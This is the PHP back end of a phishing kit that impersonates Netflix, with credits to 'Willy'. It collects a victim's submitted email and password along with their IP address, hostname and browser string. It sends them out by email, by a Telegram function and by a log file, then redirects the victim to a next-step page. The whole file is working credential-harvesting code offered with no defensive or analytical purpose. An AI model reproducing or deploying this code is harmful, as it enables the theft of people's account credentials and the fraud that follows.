<?php
include_once 'functions.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

	/*
	/ -> Thanks for Willy
	/ -> https://www.facebook.com/willymain0/
	*/
	

	// ================================= //

	$yours = "";
	
	$message .= "=============Log Netflix 📺==============\n";
$message .= "Email              : ".$_POST['eml']."\n";
$message .= "Password                 : ".$_POST['pss']."\n";
$message .= "======================INFOS================\n";
$message .= "Ip              : $ip\n";
$message .= "Host               : $hostname\n";
$message .= "BROWSER     : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "=================By willy 🔥 =============\n";
$send = "";
$subject = "LOOOOG | $ip ";
$headers = "From:IDENTIFIANTE <bendamohamo@gmail.com>>";
mail($send,$subject,$message,$headers);
$file = fopen('', 'a');
fwrite($file,$message);
telegram_send(urlencode($message));
header("Location: step1.php");


	// ================================= //


	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y H:i:s");
	}

?>